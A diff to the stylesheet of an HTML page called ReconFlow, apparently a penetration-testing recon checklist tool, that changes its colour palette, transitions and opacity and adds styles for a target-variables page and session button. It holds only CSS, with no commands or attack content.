@@ -5,9 +5,10 @@
 <title>ReconFlow</title>
 <style>
 :root {
-  --bg:#0d1117; --bg2:#161b22; --bg3:#1c2128; --border:#30363d;
-  --text:#e6edf3; --muted:#8b949e; --green:#3fb950; --cyan:#58a6ff;
-  --yellow:#d29922; --red:#f85149; --purple:#a371f7; --orange:#f0883e;
+  --bg:#0c0e14; --bg2:#111420; --bg3:#181c28; --border:#232840;
+  --text:#c8d3e8; --muted:#4e5872; --dim:#1a1e2c;
+  --cyan:#6e8ef0; --green:#5db87a; --orange:#d4955a;
+  --red:#d45f6a; --yellow:#c9974a; --purple:#9078d4;
   --mono:'Courier New',Courier,monospace;
 }
 *{box-sizing:border-box;margin:0;padding:0;}
@@ -15,44 +16,50 @@ body{background:var(--bg);color:var(--text);font-family:var(--mono);height:100vh
 
 /* HEADER */
 .header{background:var(--bg2);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;align-items:center;gap:12px;flex-shrink:0;}
-.logo{color:var(--green);font-size:15px;font-weight:bold;letter-spacing:3px;}
+.logo{color:var(--text);font-size:14px;font-weight:bold;letter-spacing:4px;}
 .logo span{color:var(--muted);font-size:11px;font-weight:normal;letter-spacing:1px;margin-left:6px;}
 .ip-label{color:var(--muted);font-size:11px;}
-.ip-input{background:var(--bg3);border:1px solid var(--border);color:var(--cyan);padding:4px 10px;font-family:var(--mono);font-size:13px;border-radius:4px;width:180px;}
+.ip-input{background:var(--bg3);border:1px solid var(--border);color:var(--cyan);padding:4px 10px;font-family:var(--mono);font-size:13px;border-radius:4px;width:180px;transition:border-color .15s;}
 .ip-input:focus{outline:none;border-color:var(--cyan);}
-.ip-input::placeholder{color:#484f58;}
-.btn-hdr{background:none;border:1px solid var(--border);color:var(--muted);padding:3px 10px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;}
+.ip-input::placeholder{color:var(--muted);opacity:.4;}
+.btn-hdr{background:none;border:1px solid var(--border);color:var(--muted);padding:3px 10px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;transition:all .15s;}
 .btn-hdr:hover{border-color:var(--red);color:var(--red);}
+.hdr-session{background:none;border:1px solid #2d3655;color:var(--cyan);padding:3px 14px;font-family:var(--mono);font-size:11px;font-weight:700;cursor:pointer;border-radius:3px;letter-spacing:.5px;transition:all .15s;white-space:nowrap;}
+.hdr-session:hover{background:rgba(110,142,240,.1);border-color:var(--cyan);}
+.hdr-session.active{background:rgba(110,142,240,.15);border-color:var(--cyan);}
+.hdr-fill{flex:1;}
 .hdr-hint{color:var(--muted);font-size:11px;}
 
 /* LANG TOGGLE */
 .lang-wrap{margin-left:auto;display:flex;gap:4px;}
-.lang-btn{background:none;border:1px solid var(--border);color:var(--muted);padding:3px 10px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;}
+.lang-btn{background:none;border:1px solid var(--border);color:var(--muted);padding:3px 10px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;transition:all .15s;}
 .lang-btn:hover{border-color:var(--cyan);color:var(--cyan);}
-.lang-btn.active{border-color:var(--cyan);color:var(--cyan);background:#0d2137;}
+.lang-btn.active{border-color:var(--cyan);color:var(--cyan);background:rgba(110,142,240,.12);}
 
 /* MAIN */
 .main{display:flex;flex:1;overflow:hidden;}
 
 /* SIDEBAR */
 .sidebar{width:160px;background:var(--bg2);border-right:1px solid var(--border);overflow-y:auto;flex-shrink:0;padding:6px 0;}
-.sb-section{padding:8px 12px 4px;font-size:10px;color:#484f58;letter-spacing:1px;}
-.sb-section-hdr{padding:6px 12px 4px;font-size:10px;color:#484f58;letter-spacing:1px;display:flex;align-items:center;justify-content:space-between;cursor:pointer;user-select:none;transition:color .12s;}
-.sb-section-hdr:hover{color:var(--muted);}
+.sb-section{padding:8px 12px 4px;font-size:10px;color:var(--muted);letter-spacing:1px;opacity:.55;}
+.sb-section-hdr{padding:6px 12px 4px;font-size:10px;color:var(--muted);letter-spacing:1px;display:flex;align-items:center;justify-content:space-between;cursor:pointer;user-select:none;transition:all .15s;opacity:.55;}
+.sb-section-hdr:hover{opacity:1;color:var(--text);}
 .sb-section-arrow{font-size:9px;transition:transform .15s;}
 .sb-section-arrow.open{transform:rotate(90deg);}
 .sb-sep{border:none;border-top:1px solid var(--border);margin:4px 10px;}
-/* Tool nav item (no pin btn) */
-.tool-nav-btn{width:100%;display:flex;align-items:center;padding:7px 12px;background:none;border:none;border-left:3px solid transparent;color:var(--muted);font-family:var(--mono);font-size:12px;cursor:pointer;text-align:left;gap:8px;transition:all .12s;}
+.tool-nav-btn{width:100%;display:flex;align-items:center;padding:7px 12px;background:none;border:none;border-left:3px solid transparent;color:var(--muted);font-family:var(--mono);font-size:12px;cursor:pointer;text-align:left;gap:8px;transition:all .15s;}
 .tool-nav-btn:hover{background:var(--bg3);color:var(--text);}
-.tool-nav-btn.active{border-left-color:var(--purple);color:var(--purple);background:var(--bg3);}
+.tool-nav-btn.active{border-left-color:var(--cyan);color:var(--cyan);background:rgba(110,142,240,.07);}
+.tool-nav-btn.target-btn{color:var(--yellow);border-left-color:transparent;}
+.tool-nav-btn.target-btn.active{border-left-color:var(--yellow);color:var(--yellow);background:rgba(201,151,74,.07);}
+.tool-nav-btn.target-btn:hover{background:var(--bg3);color:var(--yellow);}
 .tool-nav-desc{font-size:10px;opacity:.5;}
 
-/* Service row = nav button + pin button */
+/* Service row */
 .svc-row{display:flex;align-items:stretch;}
-.svc-btn{flex:1;display:flex;align-items:center;padding:7px 12px;background:none;border:none;border-left:3px solid transparent;color:var(--muted);font-family:var(--mono);font-size:12px;cursor:pointer;text-align:left;gap:8px;transition:all .12s;min-width:0;}
+.svc-btn{flex:1;display:flex;align-items:center;padding:7px 12px;background:none;border:none;border-left:3px solid transparent;color:var(--muted);font-family:var(--mono);font-size:12px;cursor:pointer;text-align:left;gap:8px;transition:all .15s;min-width:0;}
 .svc-btn:hover{background:var(--bg3);color:var(--text);}
-.svc-btn.active{border-left-color:var(--cyan);color:var(--cyan);background:var(--bg3);}
+.svc-btn.active{border-left-color:var(--cyan);color:var(--cyan);background:rgba(110,142,240,.07);}
 .svc-btn.s-progress{border-left-color:var(--yellow);}
 .svc-btn.s-done{border-left-color:var(--green);}
 .svc-label{flex:1;font-weight:bold;white-space:nowrap;}
@@ -61,17 +68,17 @@ body{background:var(--bg);color:var(--text);font-family:var(--mono);height:100vh
 .s-progress .dot{background:var(--yellow);}
 .s-done .dot{background:var(--green);}
 
-/* Pin button (+ / ✓) */
-.svc-pin{width:26px;background:none;border:none;border-left:1px solid transparent;color:transparent;font-size:13px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .12s;flex-shrink:0;}
+/* Pin button */
+.svc-pin{width:26px;background:none;border:none;border-left:1px solid transparent;color:transparent;font-size:13px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .15s;flex-shrink:0;}
 .svc-row:hover .svc-pin{color:var(--muted);border-left-color:var(--border);}
 .svc-pin.pinned{color:var(--green) !important;border-left-color:var(--green) !important;}
 
 /* Session entry */
-.session-entry{display:flex;align-items:stretch;background:#0d2137;border-left:3px solid var(--cyan);}
+.session-entry{display:flex;align-items:stretch;background:rgba(110,142,240,.06);border-left:3px solid var(--cyan);}
 .session-nav{flex:1;background:none;border:none;color:var(--cyan);font-family:var(--mono);font-size:12px;cursor:pointer;padding:7px 12px;text-align:left;font-weight:bold;}
-.session-nav:hover{background:rgba(88,166,255,.08);}
-.session-nav.active{background:rgba(88,166,255,.12);}
-.session-clr{width:26px;background:none;border:none;border-left:1px solid var(--border);color:var(--muted);cursor:pointer;font-size:12px;}
+.session-nav:hover{background:rgba(110,142,240,.08);}
+.session-nav.active{background:rgba(110,142,240,.12);}
+.session-clr{width:26px;background:none;border:none;border-left:1px solid var(--border);color:var(--muted);cursor:pointer;font-size:12px;transition:color .15s;}
 .session-clr:hover{color:var(--red);}
 
 /* CONTENT */
@@ -79,31 +86,31 @@ body{background:var(--bg);color:var(--text);font-family:var(--mono);height:100vh
 
 /* Single service header */
 .svc-header{display:flex;align-items:center;gap:10px;margin-bottom:18px;padding-bottom:12px;border-bottom:1px solid var(--border);}
-.svc-title{font-size:18px;font-weight:bold;color:var(--cyan);}
+.svc-title{font-size:18px;font-weight:bold;color:var(--text);}
 .badge{background:var(--bg3);border:1px solid var(--border);color:var(--muted);padding:1px 8px;border-radius:4px;font-size:11px;}
 .status-wrap{margin-left:auto;display:flex;gap:6px;align-items:center;}
 .status-lbl{font-size:11px;color:var(--muted);}
-.btn-st{background:var(--bg3);border:1px solid var(--border);color:var(--muted);padding:3px 10px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;transition:all .12s;}
+.btn-st{background:var(--bg3);border:1px solid var(--border);color:var(--muted);padding:3px 10px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;transition:all .15s;}
 .btn-st:hover{border-color:var(--yellow);color:var(--yellow);}
 .btn-st.is-progress{border-color:var(--yellow);color:var(--yellow);}
 .btn-st.is-done{border-color:var(--green);color:var(--green);}
 
-/* Session block (in session view) */
+/* Session block */
 .session-block{margin-bottom:16px;border:1px solid var(--border);border-radius:6px;overflow:hidden;}
-.session-block-hdr{display:flex;align-items:center;gap:10px;padding:10px 14px;background:var(--bg2);cursor:pointer;user-select:none;border-bottom:1px solid var(--border);}
+.session-block-hdr{display:flex;align-items:center;gap:10px;padding:10px 14px;background:var(--bg2);cursor:pointer;user-select:none;border-bottom:1px solid var(--border);transition:background .15s;}
 .session-block-hdr:hover{background:var(--bg3);}
 .sbhdr-arrow{color:var(--muted);font-size:11px;width:12px;}
-.sbhdr-title{color:var(--cyan);font-weight:bold;font-size:14px;}
+.sbhdr-title{color:var(--text);font-weight:bold;font-size:14px;}
 .sbhdr-port{color:var(--muted);font-size:11px;}
 .sbhdr-status{margin-left:auto;font-size:11px;}
 .sbhdr-status.s-done{color:var(--green);}
 .sbhdr-status.s-progress{color:var(--yellow);}
 .sbhdr-status.s-none{color:var(--muted);}
-.sbhdr-stbtn{background:var(--bg3);border:1px solid var(--border);color:var(--muted);padding:2px 8px;font-family:var(--mono);font-size:10px;cursor:pointer;border-radius:3px;margin-left:6px;}
+.sbhdr-stbtn{background:var(--bg3);border:1px solid var(--border);color:var(--muted);padding:2px 8px;font-family:var(--mono);font-size:10px;cursor:pointer;border-radius:3px;margin-left:6px;transition:all .15s;}
 .sbhdr-stbtn:hover{border-color:var(--yellow);color:var(--yellow);}
 .sbhdr-stbtn.is-progress{border-color:var(--yellow);color:var(--yellow);}
 .sbhdr-stbtn.is-done{border-color:var(--green);color:var(--green);}
-.sbhdr-rmv{background:none;border:none;color:var(--muted);cursor:pointer;font-size:12px;margin-left:4px;padding:0 4px;}
+.sbhdr-rmv{background:none;border:none;color:var(--muted);cursor:pointer;font-size:12px;margin-left:4px;padding:0 4px;transition:color .15s;}
 .sbhdr-rmv:hover{color:var(--red);}
 .session-block-body{padding:14px 16px;}
 
@@ -111,128 +118,171 @@ body{background:var(--bg);color:var(--text);font-family:var(--mono);height:100vh
 .session-hdr{margin-bottom:18px;padding-bottom:12px;border-bottom:1px solid var(--border);}
 .session-hdr-top{display:flex;align-items:center;gap:10px;margin-bottom:8px;}
 .session-tags{display:flex;flex-wrap:wrap;gap:6px;}
-.stag{background:var(--bg3);border:1px solid var(--cyan);color:var(--cyan);padding:2px 8px;border-radius:3px;font-size:11px;}
+.stag{background:var(--bg3);border:1px solid var(--border);color:var(--muted);padding:2px 8px;border-radius:3px;font-size:11px;}
 
 /* PHASE */
 .phase{margin-bottom:20px;}
-.phase-title{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:10px;display:flex;align-items:center;gap:8px;}
+.phase-title{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;display:flex;align-items:center;gap:8px;opacity:.6;}
 .phase-title::after{content:'';flex:1;height:1px;background:var(--border);}
 
 /* TOOL TABS */
-.tool-tabs{display:flex;gap:5px;margin-bottom:10px;flex-wrap:wrap;padding-bottom:8px;border-bottom:1px dashed var(--border);}
-.tool-tab{background:var(--bg3);border:1px solid var(--border);color:var(--muted);padding:4px 14px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;transition:all .12s;}
-.tool-tab:hover{border-color:#484f58;color:var(--text);}
-.tool-tab.active{background:#0d2137;border-color:var(--cyan);color:var(--cyan);}
+.tool-tabs{display:flex;gap:5px;margin-bottom:10px;flex-wrap:wrap;padding-bottom:8px;border-bottom:1px solid var(--border);}
+.tool-tab{background:var(--bg3);border:1px solid var(--border);color:var(--muted);padding:4px 14px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;transition:all .15s;}
+.tool-tab:hover{border-color:var(--muted);color:var(--text);}
+.tool-tab.active{background:rgba(110,142,240,.1);border-color:var(--cyan);color:var(--cyan);}
 
 /* CMD CARD */
-.cmd-card{background:var(--bg2);border:1px solid var(--border);border-radius:5px;margin-bottom:8px;transition:border-color .12s;}
-.cmd-card:hover{border-color:#484f58;}
-.cmd-card.done{opacity:.45;border-color:var(--green);}
-.cmd-card.done .cmd-purpose{text-decoration:line-through;color:var(--muted);}
+.cmd-card{background:var(--bg2);border:1px solid var(--border);border-radius:5px;margin-bottom:8px;transition:border-color .15s;}
+.cmd-card:hover{border-color:#363c58;}
+.cmd-card.done{opacity:.38;}
+.cmd-card.done .cmd-purpose{text-decoration:line-through;}
 .cmd-top{display:flex;align-items:center;gap:9px;padding:9px 12px;}
 .cmd-check{width:15px;height:15px;cursor:pointer;flex-shrink:0;accent-color:var(--green);}
 .cmd-purpose{flex:1;font-size:12px;color:var(--text);}
-.btn-copy{background:none;border:1px solid var(--border);color:var(--muted);padding:2px 8px;font-family:var(--mono);font-size:10px;cursor:pointer;border-radius:3px;flex-shrink:0;transition:all .12s;}
+.btn-copy{background:none;border:1px solid var(--border);color:var(--muted);padding:2px 8px;font-family:var(--mono);font-size:10px;cursor:pointer;border-radius:3px;flex-shrink:0;transition:all .15s;}
 .btn-copy:hover{border-color:var(--cyan);color:var(--cyan);}
 .btn-copy.copied{border-color:var(--green);color:var(--green);}
-.btn-log{background:none;border:1px solid var(--border);color:var(--muted);padding:2px 7px;font-family:var(--mono);font-size:11px;font-weight:700;cursor:pointer;border-radius:3px;flex-shrink:0;transition:all .12s;}
+.btn-log{background:none;border:1px solid var(--border);color:var(--muted);padding:2px 7px;font-family:var(--mono);font-size:11px;font-weight:700;cursor:pointer;border-radius:3px;flex-shrink:0;transition:all .15s;}
 .btn-log:hover{border-color:var(--green);color:var(--green);}
 .btn-log.logged{border-color:var(--green);color:var(--green);}
+
 /* CMD LOG page */
 .cmdlog-hdr{display:flex;align-items:center;gap:10px;margin-bottom:18px;padding-bottom:12px;border-bottom:1px solid var(--border);}
 .cmdlog-count{font-size:11px;color:var(--muted);font-family:var(--mono);}
-.cmdlog-entry{background:var(--bg2);border:1px solid var(--border);border-left:3px solid var(--green);border-radius:5px;margin-bottom:12px;overflow:hidden;}
+.cmdlog-entry{background:var(--bg2);border:1px solid var(--border);border-left:3px solid #363c58;border-radius:5px;margin-bottom:12px;overflow:hidden;transition:border-left-color .15s;}
+.cmdlog-entry:hover{border-left-color:var(--green);}
 .cmdlog-entry-hdr{display:flex;align-items:center;gap:8px;padding:7px 12px;background:var(--bg3);border-bottom:1px solid var(--border);}
 .cmdlog-ts{font-family:var(--mono);font-size:10px;color:var(--muted);}
-.cmdlog-tool{font-family:var(--mono);font-size:10px;font-weight:700;padding:2px 7px;border-radius:3px;background:#0d2a45;color:#58b8f5;border:1px solid #1e5a8c;}
-.cmdlog-tool.lin{background:#0d2e0d;color:#4ecf6e;border-color:#1e6a2e;}
-.cmdlog-tool.both{background:#211a08;color:#c8a84b;border-color:#6a5218;}
+.cmdlog-tool{font-family:var(--mono);font-size:10px;font-weight:700;padding:2px 7px;border-radius:3px;background:#141e38;color:#6e8ef0;border:1px solid #1e2d58;}
+.cmdlog-tool.lin{background:#152218;color:#5db87a;border-color:#1e3825;}
+.cmdlog-tool.both{background:#261c12;color:#c9974a;border-color:#42301c;}
 .cmdlog-purpose{font-size:11px;color:var(--text);flex:1;}
-.cmdlog-del{background:none;border:none;color:var(--muted);cursor:pointer;font-size:13px;padding:0 4px;transition:color .12s;}
-.cmdlog-del:hover{color:var(--red);}
+.cmdlog-del{background:none;border:none;color:var(--muted);cursor:pointer;font-size:13px;padding:0 4px;transition:color .15s;opacity:.5;}
+.cmdlog-del:hover{color:var(--red);opacity:1;}
 .cmdlog-body{padding:10px 12px;}
 .cmdlog-cmd{background:var(--bg);border:1px solid var(--border);border-radius:3px;padding:6px 10px;font-family:var(--mono);font-size:12px;color:var(--orange);white-space:pre-wrap;word-break:break-all;margin-bottom:8px;user-select:all;}
-.cmdlog-output{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:var(--mono);font-size:11px;border-radius:3px;resize:vertical;min-height:52px;box-sizing:border-box;}
+.cmdlog-output{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:var(--mono);font-size:11px;border-radius:3px;resize:vertical;min-height:52px;box-sizing:border-box;transition:border-color .15s;}
 .cmdlog-output:focus{outline:none;border-color:var(--purple);}
-.cmdlog-output::placeholder{color:var(--muted);}
+.cmdlog-output::placeholder{color:var(--muted);opacity:.5;}
 .cmdlog-actions{display:flex;gap:8px;margin-bottom:16px;}
-.btn-export{background:none;border:1px solid var(--green);color:var(--green);padding:4px 12px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;transition:all .12s;}
-.btn-export:hover{background:rgba(63,185,80,.1);}
-.btn-logclr{background:none;border:1px solid var(--border);color:var(--muted);padding:4px 12px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;transition:all .12s;}
+.btn-export{background:none;border:1px solid #2a3e30;color:var(--green);padding:4px 12px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;transition:all .15s;}
+.btn-export:hover{background:rgba(93,184,122,.08);border-color:var(--green);}
+.btn-logclr{background:none;border:1px solid var(--border);color:var(--muted);padding:4px 12px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;transition:all .15s;}
 .btn-logclr:hover{border-color:var(--red);color:var(--red);}
+
 .cmd-body{padding:0 12px 10px 36px;}
 .cmd-code{background:var(--bg);border:1px solid var(--border);border-radius:3px;padding:6px 10px;font-family:var(--mono);font-size:12px;color:var(--orange);white-space:pre-wrap;word-break:break-all;margin-bottom:5px;user-select:all;}
-.cmd-hint{font-size:11px;color:var(--muted);margin-bottom:5px;}
-.cmd-note{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--muted);padding:3px 8px;font-family:var(--mono);font-size:11px;border-radius:3px;resize:vertical;min-height:24px;display:none;}
+.cmd-hint{font-size:11px;color:var(--muted);margin-bottom:5px;opacity:.65;}
+.cmd-note{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--muted);padding:3px 8px;font-family:var(--mono);font-size:11px;border-radius:3px;resize:vertical;min-height:24px;display:none;transition:border-color .15s;}
 .cmd-note:focus{outline:none;border-color:var(--purple);color:var(--text);}
-.cmd-note::placeholder{color:#384048;}
+.cmd-note::placeholder{color:var(--muted);opacity:.35;}
 .note-wrap.open .cmd-note{display:block;}
-.note-toggle{background:none;border:none;color:#484f58;font-family:var(--mono);font-size:10px;cursor:pointer;padding:2px 0;display:flex;align-items:center;gap:3px;transition:color .12s;letter-spacing:.5px;}
-.note-toggle:hover{color:var(--muted);}
-.note-wrap.open .note-toggle{color:var(--muted);}
+.note-toggle{background:none;border:none;color:var(--muted);font-family:var(--mono);font-size:10px;cursor:pointer;padding:2px 0;display:flex;align-items:center;gap:3px;transition:opacity .15s;letter-spacing:.5px;opacity:.3;}
+.note-toggle:hover{opacity:.7;}
+.note-wrap.open .note-toggle{opacity:.55;}
 
 /* WELCOME */
 .welcome{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:14px;color:var(--muted);}
-.welcome-art{color:var(--green);font-size:11px;line-height:1.4;text-align:center;}
+.welcome-art{color:var(--cyan);font-size:11px;line-height:1.4;text-align:center;opacity:.25;}
 
 /* INFO BUTTON */
-.btn-info{background:none;border:1px solid var(--green);color:var(--green);padding:2px 10px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;letter-spacing:.5px;transition:all .12s;}
-.btn-info:hover{border-color:var(--green);color:var(--green);background:#0d2137;}
-.btn-info.open{border-color:var(--green);color:var(--green);background:#0d2137;}
-/* small variant for session block header */
-.btn-info-sm{background:none;border:1px solid transparent;color:var(--muted);padding:1px 7px;font-family:var(--mono);font-size:10px;cursor:pointer;border-radius:3px;transition:all .12s;}
+.btn-info{background:none;border:1px solid var(--border);color:var(--muted);padding:2px 10px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;letter-spacing:.5px;transition:all .15s;}
+.btn-info:hover{border-color:var(--cyan);color:var(--cyan);}
+.btn-info.open{border-color:var(--cyan);color:var(--cyan);background:rgba(110,142,240,.08);}
+.btn-info-sm{background:none;border:1px solid transparent;color:var(--muted);padding:1px 7px;font-family:var(--mono);font-size:10px;cursor:pointer;border-radius:3px;transition:all .15s;}
 .btn-info-sm:hover{border-color:var(--cyan);color:var(--cyan);}
 .btn-info-sm.open{border-color:var(--cyan);color:var(--cyan);}
 
 /* INFO PANEL */
-.info-panel{background:var(--bg3);border:1px solid #1e3a5f;border-left:3px solid var(--cyan);border-radius:5px;padding:14px 18px;margin-bottom:18px;display:grid;grid-template-columns:1fr 1fr;gap:14px 24px;}
-.info-summary{grid-column:1/-1;color:var(--text);font-size:12px;line-height:1.7;padding-bottom:12px;border-bottom:1px solid var(--border);}
+.info-panel{background:var(--bg3);border:1px solid var(--border);border-left:3px solid #2d3655;border-radius:5px;padding:14px 18px;margin-bottom:18px;display:grid;grid-template-columns:1fr 1fr;gap:14px 24px;}
+.info-summary{grid-column:1/-1;color:var(--text);font-size:12px;line-height:1.75;padding-bottom:12px;border-bottom:1px solid var(--border);}
 .info-block{}
-.info-block-title{color:var(--yellow);font-size:10px;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;}
+.info-block-title{color:var(--muted);font-size:10px;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:6px;opacity:.7;}
 .plat-row{grid-column:1/-1;display:flex;gap:5px;margin-bottom:4px;}
 .plat-badge{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:3px;font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;line-height:1;}
-.plat-win{background:#0d2a45;color:#58b8f5;border:1px solid #1e5a8c;}
-.plat-lin{background:#0d2e0d;color:#4ecf6e;border:1px solid #1e6a2e;}
+.plat-win{background:#141e38;color:#6e8ef0;border:1px solid #1e2d58;}
+.plat-lin{background:#152218;color:#5db87a;border:1px solid #1e3825;}
 .rtool-row{display:flex;flex-wrap:wrap;gap:5px;margin-top:5px;}
-.rtool-btn{font-family:var(--mono);font-size:10px;font-weight:600;padding:3px 9px;border-radius:3px;cursor:pointer;border:1px solid;transition:filter .12s;background:none;line-height:1.4;}
-.rtool-btn:hover{filter:brightness(1.25);}
-.rtool-win{color:#58b8f5;border-color:#1e5a8c;background:#0d2a45;}
-.rtool-lin{color:#4ecf6e;border-color:#1e6a2e;background:#0d2e0d;}
-.rtool-both{color:#c8a84b;border-color:#6a5218;background:#211a08;}
+.rtool-btn{font-family:var(--mono);font-size:10px;font-weight:600;padding:3px 9px;border-radius:3px;cursor:pointer;border:1px solid;transition:all .15s;background:none;line-height:1.4;}
+.rtool-btn:hover{opacity:.8;}
+.rtool-win{color:#6e8ef0;border-color:#1e2d58;background:#141e38;}
+.rtool-lin{color:#5db87a;border-color:#1e3825;background:#152218;}
+.rtool-both{color:#c9974a;border-color:#42301c;background:#261c12;}
 .info-list{list-style:none;padding:0;}
-.info-list li{font-size:11px;color:var(--muted);padding:2px 0;line-height:1.5;}
-.info-list li::before{content:"→ ";color:var(--cyan);}
-.info-list.vuln li::before{color:var(--red);}
-.info-list.cred li::before{color:var(--green);}
+.info-list li{font-size:11px;color:var(--muted);padding:2px 0;line-height:1.55;}
+.info-list li::before{content:"› ";color:var(--cyan);opacity:.6;}
+.info-list.vuln li::before{color:var(--red);opacity:.7;}
+.info-list.cred li::before{color:var(--green);opacity:.7;}
 .info-cred{display:inline-block;background:var(--bg);border:1px solid var(--border);padding:1px 7px;border-radius:3px;color:var(--orange);font-size:11px;margin:2px 2px 2px 0;}
-/* info panel inside session block */
-.session-info-panel{background:var(--bg3);border:1px solid #1e3a5f;border-left:3px solid var(--cyan);border-radius:5px;padding:12px 16px;margin-bottom:14px;display:grid;grid-template-columns:1fr 1fr;gap:12px 20px;}
+.session-info-panel{background:var(--bg3);border:1px solid var(--border);border-left:3px solid #2d3655;border-radius:5px;padding:12px 16px;margin-bottom:14px;display:grid;grid-template-columns:1fr 1fr;gap:12px 20px;}
 .session-info-panel .info-summary{grid-column:1/-1;color:var(--text);font-size:12px;line-height:1.6;padding-bottom:10px;border-bottom:1px solid var(--border);}
 
 /* STAR / FAVORITE */
-.btn-star{background:none;border:none;color:var(--muted);font-size:15px;cursor:pointer;padding:0 4px;line-height:1;transition:color .12s;}
-.btn-star:hover{color:var(--yellow);}
-.btn-star.starred{color:var(--yellow);}
-.btn-rmv-sm{background:none;border:none;color:var(--muted);font-size:12px;cursor:pointer;padding:0 4px;}
+.btn-star{background:none;border:none;color:var(--muted);font-size:15px;cursor:pointer;padding:0 4px;line-height:1;transition:all .15s;opacity:.4;}
+.btn-star:hover{color:var(--yellow);opacity:1;}
+.btn-star.starred{color:var(--yellow);opacity:1;}
+.btn-rmv-sm{background:none;border:none;color:var(--muted);font-size:12px;cursor:pointer;padding:0 4px;transition:color .15s;}
 .btn-rmv-sm:hover{color:var(--red);}
 
 /* CUSTOM CMD FORM */
-.custom-form{display:none;flex-direction:column;gap:6px;padding:10px 12px;background:var(--bg3);border:1px dashed var(--border);border-radius:5px;margin-top:8px;}
+.custom-form{display:none;flex-direction:column;gap:6px;padding:10px 12px;background:var(--bg3);border:1px solid var(--border);border-radius:5px;margin-top:8px;}
 .custom-form-wrap.open .custom-form{display:flex;}
-.btn-custom-toggle{background:none;border:1px dashed var(--border);color:var(--muted);font-family:var(--mono);font-size:11px;cursor:pointer;padding:5px 12px;border-radius:3px;width:100%;text-align:left;transition:all .12s;margin-top:10px;}
+.btn-custom-toggle{background:none;border:1px dashed var(--border);color:var(--muted);font-family:var(--mono);font-size:11px;cursor:pointer;padding:5px 12px;border-radius:3px;width:100%;text-align:left;transition:all .15s;margin-top:10px;}
 .btn-custom-toggle:hover{border-color:var(--purple);color:var(--purple);}
 .custom-form-wrap.open .btn-custom-toggle{border-color:var(--purple);color:var(--purple);}
-.custom-input{background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 8px;font-family:var(--mono);font-size:11px;border-radius:3px;width:100%;}
-.custom-input:focus{outline:none;border-color:var(--purple);color:var(--text);}
-.custom-input::placeholder{color:#384048;}
+.custom-input{background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 8px;font-family:var(--mono);font-size:11px;border-radius:3px;width:100%;transition:border-color .15s;}
+.custom-input:focus{outline:none;border-color:var(--purple);}
+.custom-input::placeholder{color:var(--muted);opacity:.4;}
 .custom-cmd{resize:vertical;min-height:40px;}
-.btn-add{background:none;border:1px solid var(--purple);color:var(--purple);padding:4px 14px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;align-self:flex-start;transition:all .12s;}
-.btn-add:hover{background:var(--purple);color:var(--bg);}
+.btn-add{background:none;border:1px solid #3a2f60;color:var(--purple);padding:4px 14px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;align-self:flex-start;transition:all .15s;}
+.btn-add:hover{background:rgba(144,120,212,.12);border-color:var(--purple);}
 
 /* scrollbar */
 ::-webkit-scrollbar{width:5px;}
-::-webkit-scrollbar-track{background:var(--bg);}
-::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
+::-webkit-scrollbar-track{background:var(--bg2);}
+::-webkit-scrollbar-thumb{background:#2a2e42;border-radius:3px;}
+::-webkit-scrollbar-thumb:hover{background:#363c58;}
+
+/* TARGET PAGE */
+.target-page-hdr{margin-bottom:20px;padding-bottom:12px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;}
+.target-page-title{font-size:18px;font-weight:bold;color:var(--text);}
+.target-page-sub{font-size:11px;color:var(--muted);opacity:.55;}
+.target-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(258px,1fr));gap:10px;margin-bottom:24px;}
+.target-var-card{background:var(--bg2);border:1px solid var(--border);border-radius:5px;padding:12px 14px;transition:border-color .15s;}
+.target-var-card:hover{border-color:#363c58;}
+.target-var-name{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:6px;display:flex;align-items:center;gap:8px;}
+.target-var-ph{font-size:10px;color:var(--cyan);opacity:.4;font-family:var(--mono);}
+.target-var-input{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--orange);padding:6px 10px;font-family:var(--mono);font-size:13px;border-radius:3px;transition:border-color .15s;}
+.target-var-input:focus{outline:none;border-color:var(--cyan);}
+.target-var-input::placeholder{color:var(--muted);opacity:.22;}
+.target-var-hint{font-size:10px;color:var(--muted);margin-top:5px;opacity:.4;line-height:1.4;}
+.target-session-preview{background:var(--bg2);border:1px solid var(--border);border-left:3px solid #2d3655;border-radius:5px;padding:14px 18px;margin-top:8px;}
